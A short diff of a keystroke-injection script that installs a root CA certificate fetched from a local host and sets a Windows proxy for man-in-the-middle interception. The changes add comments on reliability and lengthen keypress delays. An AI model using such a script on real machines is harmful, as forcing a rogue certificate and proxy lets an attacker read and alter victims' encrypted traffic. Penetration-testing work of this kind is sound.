@@ -1,5 +1,8 @@
 /* windows_mitm_proxy.js
  * Installs the specified Root CA and sets windows to use the proxy specified. 
+ * It's not the most reliable in my experience but does work. 
+ * I will work on it and try to improve reliability especially around the acceptance
+ * of the root CA cert.
  */
 proxyServer = '192.168.0.15:8080'
 certificatURL = 'http://192.168.0.15:9000/burp_cert.der'
@@ -38,9 +41,9 @@ delay(2000)
 
 // Move to ok and select it
 press('GUI TAB')
-delay(500)
+delay(1000)
 press('GUI TAB')
-delay(500)
+delay(1000)
 press('LEFT')
 delay(100)
 press('ENTER')
